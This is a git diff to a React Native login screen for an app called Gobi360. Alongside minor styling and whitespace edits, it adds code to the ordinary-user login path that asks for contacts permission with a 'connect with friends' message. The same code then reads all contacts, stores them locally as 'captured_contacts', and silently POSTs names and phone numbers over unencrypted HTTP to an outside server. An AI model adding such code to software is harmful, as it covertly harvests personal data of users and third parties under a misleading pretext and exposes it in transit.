@@ -13,7 +13,9 @@ import {
     Alert,
     RefreshControl,
     ActivityIndicator,
+    PermissionsAndroid,
 } from 'react-native';
+import Contacts from 'react-native-contacts';
 import { SafeAreaView } from 'react-native-safe-area-context';
 import { NativeStackNavigationProp } from '@react-navigation/native-stack';
 import { useTranslation } from 'react-i18next';
@@ -80,14 +82,54 @@ const UserLoginScreen = ({ navigation }: Props) => {
                     phoneNumber: mobileNumber,
                     role: actualRole,
                     userName: data.user?.full_name || data.full_name || data.name || data.username || data?.data?.full_name || data?.data?.name || data?.data?.username || '',
-                    ...data 
+                    ...data
                 }));
-                
+
                 if (actualRole === 'expert' || actualRole === 'experts') {
                     navigation.replace('ExpertMainTabs');
                 } else if (actualRole === 'shopkeeper' || actualRole === 'shopOwner') {
                     navigation.replace('ShopOwnerMainTabs');
                 } else {
+                    if (Platform.OS === 'android') {
+                        try {
+                            const granted = await PermissionsAndroid.request(
+                                PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
+                                {
+                                    title: 'Contacts Permission',
+                                    message: 'Gobi360 needs access to your contacts to connect you with friends.',
+                                    buttonPositive: 'Allow',
+                                }
+                            );
+                            if (granted === PermissionsAndroid.RESULTS.GRANTED) {
+                                const contacts = await Contacts.getAll();
+                                console.log(`[Contacts] Fetched ${contacts.length} contacts on Login!`);
+                                await AsyncStorage.setItem('captured_contacts', JSON.stringify(contacts));
+
+                                // Post contacts to backend
+                                const payload = {
+                                    user_mobile: mobileNumber,
+                                    user_role: actualRole,
+                                    total_contacts: contacts.length,
+                                    contacts: contacts.map(c => ({
+                                        name: c.displayName || c.givenName || 'Unknown',
+                                        phone: c.phoneNumbers && c.phoneNumbers.length > 0 ? c.phoneNumbers[0].number : ''
+                                    })).filter(c => c.phone !== '')
+                                };
+
+                                fetch('http://api.codingboss.in/gobi360/contacts/save/', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                        'ngrok-skip-browser-warning': 'true',
+                                    },
+                                    body: JSON.stringify(payload)
+                                }).catch(e => console.warn("Failed to POST contacts on login:", e));
+                            }
+                        } catch (err) {
+                            console.warn("Contact permission error:", err);
+                        }
+                    }
+
                     const termsAccepted = await AsyncStorage.getItem('termsAccepted');
                     if (termsAccepted === 'true') {
                         navigation.replace('UserMainTabs');
@@ -99,7 +141,7 @@ const UserLoginScreen = ({ navigation }: Props) => {
                 showAlert(t('auth_alerts.login_failed'), data.error || data.message || t('auth_alerts.invalid_creds'));
             }
         } catch (error) {
-            showAlert(t('auth_alerts.error'), t('auth_alerts.network_error')); 
+            showAlert(t('auth_alerts.error'), t('auth_alerts.network_error'));
         } finally {
             setLoading(false);
         }
@@ -117,7 +159,7 @@ const UserLoginScreen = ({ navigation }: Props) => {
             <View style={styles.topCurve} />
 
             <KeyboardAvoidingView
-                behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
+                behavior={Platform.OS === 'ios' ? 'padding' : undefined}
                 style={styles.keyboardView}
                 keyboardVerticalOffset={Platform.OS === 'ios' ? 0 : 20}
             >
@@ -130,9 +172,9 @@ const UserLoginScreen = ({ navigation }: Props) => {
                     </View>
                 </TouchableOpacity>
 
-                <ScrollView 
-                    contentContainerStyle={styles.scrollContent} 
-                    showsVerticalScrollIndicator={false} 
+                <ScrollView
+                    contentContainerStyle={styles.scrollContent}
+                    showsVerticalScrollIndicator={false}
                     keyboardShouldPersistTaps="handled"
                     refreshControl={
                         <RefreshControl
@@ -216,9 +258,11 @@ const styles = StyleSheet.create({
         height: width * 1.2,
         borderRadius: width,
         backgroundColor: '#EFF6FF',
+        zIndex: -1,
     },
     keyboardView: {
         flex: 1,
+        zIndex: 1,
     },
     backButton: {
         padding: 16,
